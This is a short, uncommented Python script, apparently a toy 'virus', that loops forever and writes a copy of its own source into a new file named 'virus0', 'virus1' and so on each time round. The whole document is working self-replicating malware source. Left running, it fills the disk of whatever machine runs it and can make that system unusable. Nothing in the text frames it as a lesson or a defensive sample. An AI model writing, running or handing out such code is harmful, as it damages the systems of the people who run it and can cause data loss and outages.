indicator = 0

while True:
    with open("virus{0}".format(indicator), "w") as f:
        f.write(open(__file__).read())
        f.close()
        indicator += 1
